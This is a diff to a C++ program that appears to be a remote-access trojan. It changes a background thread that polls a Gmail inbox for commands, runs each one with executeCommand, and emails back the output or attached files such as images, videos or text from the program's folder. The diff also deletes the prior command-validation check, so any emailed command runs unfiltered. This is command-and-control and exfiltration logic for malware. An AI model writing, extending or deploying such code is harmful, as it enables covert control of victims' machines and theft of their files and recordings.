@@ -1,5 +1,9 @@
 #include "../includes/tasks.h"
 
+namespace fs = std::filesystem;
+const std::string script_dir = fs::current_path().parent_path().string() + "/scripts/";
+const std::string exe_dir = fs::current_path().string() + "/";
+
 void receiveResponse(SOCKET clientSock)
 {
     char buffer[1024];
@@ -387,15 +391,41 @@ int main()
     std::thread gmailThread([&clientSock]() {
         while (true)
         {
-            refreshAccessToken(); // Refresh access token periodically
-            std::string cmd = readLastEmailCommand(); // Read last command from email
-            if (!cmd.empty() && isValidCommand(cmd))
+            if (!refreshAccessToken())
             {
-                std::string response = executeCommand(cmd); // Execute command
-                sendEmail("Command Response", response); // Send response via email
+                std::cerr << "[Gmail] Failed to refresh token." << std::endl;
+                std::this_thread::sleep_for(std::chrono::minutes(10));
+                continue;
             }
 
-            Sleep(10000); // Check every 10 seconds
+            std::string cmd = readLastEmailCommand();
+            if (!cmd.empty())
+            {
+                std::string response = executeCommand(cmd);
+
+                auto ends_with = [](const std::string& str, const std::string& suffix) {
+                    return str.size() >= suffix.size() &&
+                        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
+                };
+
+                if (ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi") || ends_with(response, ".txt"))
+                {
+                    std::string filepath = exe_dir + response;
+                    if (!fs::exists(filepath)) {
+                        std::cerr << "Attachment not found: " << filepath << std::endl;
+                        sendEmail("Command Result", "Result: " + response + "\n(Attachment file missing: " + filepath + ")");
+                    } else {
+                        sendEmailWithAttachment("Command Result", "Result of command: " + cmd, filepath);
+                    }
+                }
+
+                else
+                {
+                    sendEmail("Command Result", response);
+                }
+            }
+
+            std::this_thread::sleep_for(std::chrono::seconds(10));
         }
     });
 
